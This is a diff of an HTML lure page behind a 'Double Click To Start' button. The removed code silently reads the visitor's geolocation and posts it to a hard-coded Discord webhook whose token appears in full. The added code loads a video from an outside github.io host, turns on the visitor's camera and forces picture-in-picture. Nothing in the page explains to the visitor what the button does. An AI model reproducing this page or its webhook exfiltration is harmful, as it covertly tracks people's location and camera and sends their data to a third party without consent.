@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Geolocation and Webhook</title>
+    <title>PiP and Camera</title>
     <style>
         body, html {
             margin: 0;
@@ -23,6 +23,10 @@
             cursor: pointer;
         }
 
+        video {
+            display: none;
+        }
+
         h1 {
             position: fixed;
             bottom: 20px;
@@ -35,42 +39,31 @@
 <body>
 
 <button id="actionButton">Double Click To Start</button>
+<video id="video" autoplay>
+    <source src="https://selebewsss.github.io/spofcenah2/ws.mp4" type="video/mp4">
+    Your browser does not support the video tag.
+</video>
 
 <script>
+    const videoElement = document.getElementById('video');
     const actionButton = document.getElementById('actionButton');
 
     actionButton.addEventListener('click', async () => {
         try {
-            const locationPromise = (async () => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(async (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-
-                        // Send data to Discord Webhook
-                        const webhookURL = 'https://discord.com/api/webhooks/1348210424159670322/gukDXFj2FC01Ne9_Td3C7JyQecgknXxYcTiWRjC4S40mDBuJI1JngkEOpqhbb54BCMA9';
-                        const message = {
-                            content: `Geolocation Data: Latitude: ${lat}, Longitude: ${lon}`
-                        };
-
-                        const response = await fetch(webhookURL, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(message)
-                        });
-
-                        if (response.ok) {
-                            console.log('Data sent to Discord Webhook');
-                        } else {
-                            console.error('Failed to send data to Discord');
-                        }
-                    }, (error) => {
-                        console.error('Error getting location:', error);
-                    });
-                } else {
-                    alert('Geolocation is not supported by this browser.');
+            const cameraPromise = (async () => {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                videoElement.srcObject = stream;
+                videoElement.style.display = "block";
+            })();
+            
+            const pipPromise = (async () => {
+                if (videoElement !== document.pictureInPictureElement) {
+                    await videoElement.play();
+                    await videoElement.requestPictureInPicture();
                 }
             })();
+            
+            await Promise.all([cameraPromise, pipPromise]);
         } catch (error) {
             console.error('Error:', error);
         }
